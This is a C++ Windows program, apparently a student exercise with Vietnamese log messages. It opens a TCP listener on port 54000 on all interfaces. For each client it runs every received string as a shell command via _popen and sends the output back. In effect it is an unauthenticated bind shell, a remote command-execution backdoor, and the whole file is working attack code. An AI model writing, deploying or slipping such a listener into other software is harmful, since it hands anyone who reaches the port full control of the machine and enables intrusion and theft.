// ConsoleApplication1.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <string>
#pragma comment (lib, "Ws2_32.lib")


using namespace std;

string exec(char* cmd) {
    char buffer[128];
    string result = "";
    FILE* pipe = _popen(cmd, "r");
    while (fgets(buffer, sizeof buffer, pipe) != NULL) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}
DWORD WINAPI cmd(LPVOID Socket) {

    SOCKET clientSock = (SOCKET)Socket;
    //send(clientSock,"hello from sever!!",sizeof("hello from sever!!"), 0);
    char* buffer;
    DWORD byteRead = 0;

    while (1) {

        int iRecv;
        char* input = NULL;
        input = (char*)calloc(BUFSIZ, sizeof(char));

        iRecv = recv(clientSock, input, BUFSIZ, 0);
        string buff = exec(input);
        buffer = (char*)buff.c_str();
        //cout << buffer << endl;
        byteRead = buff.length();
        //cout << byteRead << endl;
        //send output size
        int iSend = send(clientSock, (char*)&byteRead, sizeof(byteRead), 0);
        //send output
        if (byteRead != 0) {
            int iSend = send(clientSock, buffer, byteRead, 0);
        }
    }
    return 0;
}


DWORD WINAPI serve(LPVOID serverSocket) {
    SOCKET clientSocket;
    struct sockaddr_in clientAddr;
    int iclientAddr = sizeof(clientAddr);
    SOCKET ServerSocket = (SOCKET)serverSocket;
    while (true)
    {
        clientSocket = accept(ServerSocket, (sockaddr*)&clientAddr, &iclientAddr);
        if (clientSocket == INVALID_SOCKET) {
            return WSAGetLastError();
        }
        else
        {
            cout << "ket noi thanh cong" << endl;
        }
        char ip[INET_ADDRSTRLEN];
        int port = ntohs(clientAddr.sin_port);
        ZeroMemory(ip, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &clientAddr.sin_addr, ip, INET_ADDRSTRLEN);
        cout << ip << "ket noi o port " << port << endl;
        DWORD iThread;
        CreateThread(NULL, 0, cmd, (LPVOID)clientSocket, 0, &iThread);
    }

    ExitThread(0);
}
int main()
{
    WSADATA wsaData;
    int wsaStartUp;

    wsaStartUp = WSAStartup(MAKEWORD(2,2), &wsaData);

    if (wsaStartUp !=0) {
        cout << "WSAStartup khong thanh cong" << endl;
    }
    else
    {
        cout<<"WSAStartup thanh cong \n"<<endl;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.S_un.S_addr = INADDR_ANY;
    serverAddr.sin_port = htons(54000);

    SOCKET serverSocket;

    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (serverSocket == INVALID_SOCKET) {
        cout << "tao server socket khong thanh cong" << endl;
    }
    else
    {
        cout << "tao server socket thanh cong " << endl;
    }
    
    int iBind;
    iBind = bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));

    if (iBind == SOCKET_ERROR) {
        cout << "gan ip cho socket khong thanh cong" << WSAGetLastError()  << endl;
    }
    else {
        cout << "gan ip cho socket thanh cong " << endl;
    }

    int iListen;

    iListen = listen(serverSocket, SOMAXCONN);

    if (iListen == SOCKET_ERROR)
    {
        cout << "lang nghe khong thanh cong " << endl;
    }
    else
    {
        cout << "lang nghe thanh cong " << endl;
    }
    DWORD serveThread;
    HANDLE hServeThread;
    hServeThread = CreateThread(NULL, 0, serve, (LPVOID)serverSocket, 0, &serveThread);
    WaitForSingleObject(hServeThread, INFINITE);

}

